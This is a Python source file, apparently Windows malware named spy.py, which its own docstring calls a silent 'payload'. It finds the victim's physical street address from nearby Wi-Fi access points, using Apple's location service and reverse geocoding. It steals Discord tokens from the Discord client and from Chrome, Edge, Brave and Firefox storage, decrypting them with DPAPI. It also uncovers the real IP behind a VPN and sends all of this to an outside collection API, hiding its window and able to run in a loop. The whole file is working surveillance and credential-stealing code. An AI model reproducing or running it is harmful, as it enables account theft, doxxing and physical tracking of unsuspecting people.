#!/usr/bin/env python3
"""
spy.py - payload: radio location (VPN-proof) + Discord token + real IP -> API.
Silent. No logs. Pure stdlib.
"""

import base64
import ctypes
import ctypes.wintypes as wt
import gzip
import json
import os
import random
import re
import socket
import sqlite3
import ssl
import struct
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path
from statistics import median

API_URL = "https://address-appraisal-desk.lovable.app/api/events/adress/send"
UA = {"User-Agent": "spy/1.0"}
UNVERIFIED = ssl._create_unverified_context()
NO_WIN = 0x08000000                              # subprocess.CREATE_NO_WINDOW
STATE_DIR = Path(os.environ.get("LOCALAPPDATA", ".")) / "spy"
_ADDR_CACHE = STATE_DIR / "addr_cache.json"


def already_running():
    k = ctypes.WinDLL("kernel32", use_last_error=True)
    k.CreateMutexW.restype = ctypes.c_void_p
    k.CreateMutexW(None, False, "Global\\spy_singleton")
    return ctypes.get_last_error() == 183        # ERROR_ALREADY_EXISTS


# ============================================================ 1. LOCATION ===
def scan_wifi():
    try:
        out = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"],
                             capture_output=True, text=True, timeout=15,
                             creationflags=NO_WIN).stdout
    except Exception:
        return []
    aps, mac, sig = [], None, None
    for line in out.splitlines():
        line = line.strip()
        m = re.match(r"BSSID \d+\s*:\s*([0-9a-fA-F:]{17})", line)
        if m:
            if mac:
                aps.append((mac, sig))
            mac, sig = m.group(1).lower(), None
        s = re.match(r"Signal\s*:\s*(\d+)%", line)
        if s:
            sig = int((int(s.group(1)) / 2) - 100)
    if mac:
        aps.append((mac, sig))
    return aps


def _varint(v):
    out = bytearray()
    while True:
        b, v = v & 0x7F, v >> 7
        out.append(b | (0x80 if v else 0))
        if not v:
            return bytes(out)


def _read_varint(buf, i):
    shift = val = 0
    while True:
        b = buf[i]; i += 1
        val |= (b & 0x7F) << shift
        if not (b & 0x80):
            return val, i
        shift += 7


def _fstr(n, s):
    raw = s.encode()
    return _varint((n << 3) | 2) + _varint(len(raw)) + raw


def _fvar(n, v):
    return _varint(n << 3) + _varint(v if v >= 0 else v + (1 << 64))


def _signed(v):
    return v - (1 << 64) if v >= (1 << 63) else v


_ENV = (b"\x00\x01\x00\x05" + b"en_US" + b"\x00\x13" +
        b"com.apple.locationd" + b"\x00\x0a" + b"8.1.12B411" +
        b"\x00\x00\x00\x01\x00\x00\x00")


def apple_geolocate(macs):
    if not macs:
        return None
    fixes = []
    for k in range(0, len(macs), 11):
        payload = b""
        for m in macs[k:k + 11]:
            inner = _fstr(1, m)
            payload += _varint((2 << 3) | 2) + _varint(len(inner)) + inner
        payload += _fvar(3, 0) + _fvar(4, 1)
        req = urllib.request.Request(
            "https://gs-loc.apple.com/clls/wloc",
            data=_ENV + bytes([len(payload)]) + payload,
            headers={"User-Agent": "locationd/1753.17 CFNetwork/889.9 Darwin/17.2.0",
                     "Content-Type": "application/x-www-form-urlencoded"})
        try:
            with urllib.request.urlopen(req, timeout=15, context=UNVERIFIED) as r:
                buf = r.read()
        except Exception:
            continue
        if buf[:2] == b"\x1f\x8b":
            buf = gzip.decompress(buf)
        i, n = 10, len(buf)
        while i < n:
            tag, i = _read_varint(buf, i)
            f, w = tag >> 3, tag & 7
            if w == 2:
                ln, i = _read_varint(buf, i)
                body, i = buf[i:i + ln], i + ln
                if f == 2:
                    j, lat, lng, acc = 0, None, None, None
                    while j < len(body):
                        t, j = _read_varint(body, j)
                        ff, ww = t >> 3, t & 7
                        if ww == 2:
                            l, j = _read_varint(body, j)
                            v, j = body[j:j + l], j + l
                            if ff == 2:
                                kk, loc = 0, {}
                                while kk < len(v):
                                    tt, kk = _read_varint(v, kk)
                                    f3, w3 = tt >> 3, tt & 7
                                    if w3 == 0:
                                        vv, kk = _read_varint(v, kk)
                                        loc[f3] = _signed(vv)
                                lat, lng, acc = loc.get(1), loc.get(2), loc.get(3)
                        elif ww == 0:
                            _, j = _read_varint(body, j)
                        else:
                            break
                    if lat is not None:
                        fixes.append((lat / 1e8, lng / 1e8, acc))
            elif w == 0:
                _, i = _read_varint(buf, i)
            else:
                break
    good = [f for f in fixes if f[2] is not None and 0 <= f[2] <= 10000
            and not (abs(f[0] + 180) < 1e-6 and abs(f[1] + 180) < 1e-6)]
    if not good:
        return None
    mlat, mlon = median(p[0] for p in good), median(p[1] for p in good)
    kept = [p for p in good if abs(p[0] - mlat) < 0.01 and abs(p[1] - mlon) < 0.01]
    wsum = sum(1 / (1 + p[2] ** 2) for p in kept)
    return (sum(p[0] / (1 + p[2] ** 2) for p in kept) / wsum,
            sum(p[1] / (1 + p[2] ** 2) for p in kept) / wsum,
            round(median(p[2] for p in kept)))


# ===================================================== 2. ADDRESS (3-tier) ==
def _fmt(parts):
    return ", ".join(p for p in parts if p)


def _cache_get(lat, lng):
    try:
        return json.loads(_ADDR_CACHE.read_text()).get(f"{lat:.4f},{lng:.4f}")
    except Exception:
        return None


def _cache_put(lat, lng, addr):
    try:
        STATE_DIR.mkdir(parents=True, exist_ok=True)
        d = json.loads(_ADDR_CACHE.read_text()) if _ADDR_CACHE.exists() else {}
        d[f"{lat:.4f},{lng:.4f}"] = addr
        _ADDR_CACHE.write_text(json.dumps(d))
    except Exception:
        pass


def resolve_address(lat, lng):
    cached = _cache_get(lat, lng)
    if cached:
        return cached
    try:
        q = urllib.parse.urlencode({"format": "jsonv2", "lat": lat, "lon": lng,
                                    "zoom": 18, "addressdetails": 1})
        req = urllib.request.Request(
            f"https://nominatim.openstreetmap.org/reverse?{q}",
            headers={"User-Agent": "spy/1.0 (you@example.com)"})
        with urllib.request.urlopen(req, timeout=15) as r:
            a = json.load(r).get("address", {})
        s = _fmt([a.get("house_number"), a.get("road"),
                  a.get("city") or a.get("town") or a.get("village") or a.get("hamlet"),
                  a.get("state"), a.get("postcode"), a.get("country")])
        if s:
            _cache_put(lat, lng, s)
            return s
    except Exception:
        pass
    try:
        q = urllib.parse.urlencode({"lat": lat, "lon": lng, "limit": 1})
        req = urllib.request.Request(f"https://photon.komoot.io/reverse?{q}", headers=UA)
        with urllib.request.urlopen(req, timeout=15) as r:
            p = json.load(r)["features"][0]["properties"]
        s = _fmt([p.get("housenumber"), p.get("street"),
                  p.get("city") or p.get("locality"), p.get("state"),
                  p.get("postcode"), p.get("country")])
        if s:
            _cache_put(lat, lng, s)
            return s
    except Exception:
        pass
    try:
        q = urllib.parse.urlencode({"latitude": lat, "longitude": lng,
                                    "localityLanguage": "en"})
        req = urllib.request.Request(
            f"https://api.bigdatacloud.net/data/reverse-geocode-client?{q}", headers=UA)
        with urllib.request.urlopen(req, timeout=15) as r:
            d = json.load(r)
        s = _fmt([d.get("locality") or d.get("city"), d.get("principalSubdivision"),
                  d.get("postCode"), d.get("countryName")])
        if s:
            _cache_put(lat, lng, s)
            return s
    except Exception:
        pass
    return f"{lat:.5f}, {lng:.5f}"


# ===================================================== 3. DISCORD TOKENS ====
TOKEN_RE = re.compile(
    rb"(mfa\.[A-Za-z0-9_-]{84}|[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,40})")
ENC_RE = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)")


def _dpapi(blob):
    class BLOB(ctypes.Structure):
        _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
    buf = ctypes.create_string_buffer(blob, len(blob))
    bin_ = BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    bout = BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(bout)):
        return None
    out = ctypes.string_at(bout.pbData, bout.cbData)
    ctypes.windll.kernel32.LocalFree(bout.pbData)
    return out


def _leveldb_dirs():
    appdata = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    dirs = [Path(appdata) / d / "Local Storage" / "leveldb"
            for d in ("discord", "discordcanary", "discordptb")]
    for b in ("Google/Chrome", "Microsoft/Edge", "BraveSoftware/Brave-Browser",
              "Chromium", "Vivaldi"):
        for prof in ("Default", "Profile 1", "Profile 2"):
            dirs.append(Path(local) / b / "User Data" / prof / "Local Storage" / "leveldb")
    return [d for d in dirs if d.exists()]


def snatch_tokens():
    found = {}
    for d in _leveldb_dirs():
        label = str(d).split("User Data")[0].split(os.sep)[-1] or "discord"
        for f in list(d.glob("*.ldb")) + list(d.glob("*.log")):
            try:
                raw = f.read_bytes()
            except Exception:
                continue
            for m in TOKEN_RE.findall(raw):
                found.setdefault(m.decode(), label)
            for m in ENC_RE.findall(raw):
                try:
                    dec = _dpapi(base64.b64decode(m))
                    if dec:
                        for t in TOKEN_RE.findall(dec):
                            found.setdefault(t.decode(), label + " (enc)")
                except Exception:
                    pass
    ff = Path(os.environ.get("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles"
    if ff.exists():
        for db in ff.glob("*/storage/default/https+++discord.com/ls/data.sqlite"):
            try:
                con = sqlite3.connect(f"file:{db}?immutable=1", uri=True)
                for (val,) in con.execute("SELECT value FROM data"):
                    if isinstance(val, (bytes, bytearray)):
                        for m in TOKEN_RE.findall(bytes(val)):
                            found.setdefault(m.decode(), "firefox")
            except Exception:
                pass
    return found


def discord_me(token):
    req = urllib.request.Request("https://discord.com/api/v9/users/@me",
                                 headers={"Authorization": token, **UA})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.load(r)
    except Exception:
        return None


# ============================================================ 4. REAL IP ====
VPN_HINTS = ("vpn", "tap", "tun", "wireguard", "openvpn", "tunnel",
             "tailscale", "zerotier", "wintun", "nord", "mullvad", "proton")


def local_ips():
    try:
        out = subprocess.run(["ipconfig"], capture_output=True, text=True,
                             creationflags=NO_WIN).stdout
    except Exception:
        return []
    res, adapter = [], ""
    for line in out.splitlines():
        if "adapter" in line and line.strip().endswith(":"):
            adapter = line.strip().rstrip(":")
        m = re.search(r"IPv4 Address[^:]*:\s*([\d.]+)", line)
        if m:
            is_vpn = any(h in adapter.lower() for h in VPN_HINTS)
            res.append((adapter, m.group(1), is_vpn))
    return res


def public_ip():
    for url in ("https://api.ipify.org?format=json",
                "https://ifconfig.me/all.json", "https://ipinfo.io/json"):
        try:
            with urllib.request.urlopen(url, timeout=8) as r:
                d = json.load(r)
            ip = d.get("ip") or d.get("ip_addr")
            if ip:
                return ip, d
        except Exception:
            continue
    return None, {}


def stun_ip(server=("stun.l.google.com", 19302), timeout=3):
    req = struct.pack(">HHI", 0x0001, 0x0000, 0x2112A442) + os.urandom(12)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(req, server)
        data, _ = s.recvfrom(2048)
    except Exception:
        return None
    finally:
        s.close()
    i = 20
    while i < len(data):
        atype, alen = struct.unpack(">HH", data[i:i + 4])
        val = data[i + 4:i + 4 + alen]
        if atype == 0x0020:
            ip = bytes(b ^ m for b, m in zip(val[4:8], struct.pack(">I", 0x2112A442)))
            return socket.inet_ntoa(ip)
        if atype == 0x0001:
            return socket.inet_ntoa(val[4:8])
        i += 4 + alen + ((4 - alen % 4) % 4)
    return None


# ============================================================ 5. YOUR API ===
def remote_id():
    p = STATE_DIR / "session.txt"
    try:
        return p.read_text().strip()
    except Exception:
        rid = "sess_" + "".join(random.choices("0123456789abcdef", k=8))
        try:
            STATE_DIR.mkdir(parents=True, exist_ok=True)
            p.write_text(rid)
        except Exception:
            pass
        return rid


def send_to_api(address, ip, discord_id):
    payload = {"address": address, "ip": ip,
               "remoteID": remote_id(), "discordID": discord_id}
    req = urllib.request.Request(
        API_URL, data=json.dumps(payload).encode(),
        headers={**UA, "Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=15).read()
    except Exception:
        pass


# ================================================================ MAIN =====
def main():
    aps = scan_wifi()
    fix = apple_geolocate([m for m, _ in aps])
    lat = lng = address = None
    if fix:
        lat, lng, _ = fix
        address = resolve_address(lat, lng)
    else:
        try:
            with urllib.request.urlopen("http://ip-api.com/json/", timeout=8) as r:
                d = json.load(r)
            lat, lng = d["lat"], d["lon"]
            address = resolve_address(lat, lng)
        except Exception:
            pass

    discord_id = None
    for tok in snatch_tokens():
        me = discord_me(tok)
        if me:
            discord_id = me["id"]
            break

    real_local = next((ip for _, ip, vpn in local_ips() if not vpn), None)
    pub, _ = public_ip()
    chosen_ip = pub or stun_ip() or real_local

    send_to_api(address or (f"{lat},{lng}" if lat else ""), chosen_ip, discord_id)


if __name__ == "__main__":
    if already_running():
        sys.exit(0)
    interval = 0
    if "--loop" in sys.argv:
        try:
            interval = int(sys.argv[sys.argv.index("--loop") + 1])
        except (ValueError, IndexError):
            interval = 300
    if interval:
        while True:
            try:
                main()
            except Exception:
                pass
            time.sleep(interval)
    else:
        try:
            main()
        except Exception:
            pass
